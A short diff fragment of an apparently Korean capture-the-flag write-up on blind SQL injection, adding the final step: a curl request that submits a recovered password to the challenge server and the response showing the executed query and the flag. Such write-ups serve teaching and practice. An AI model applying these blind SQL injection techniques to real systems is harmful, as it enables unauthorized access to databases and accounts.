@@ -67,4 +67,8 @@ while 1:
 
 print(pw)
 ```
-와 같이 ex code를 작성해서 pw를 
+와 같이 ex code를 작성해서 pw를 알아내서 넘기면 flag를 return 해준다.
+```sh
+❯ curl http://web.isangxcaution.xyz:20300/sql3.php\?pw\=07a89de3
+<hr>query : <strong>select id from sql3 where id='admin' and pw='07a89de3'</strong><hr><br><h2>Hello ~ Are you Admin?</h2><br><h2>FLAG : IxC{Bl1nd_sq1_1nj3ct10n_1s_funny~}</h2><br><code><span style="color: #000000">
+```
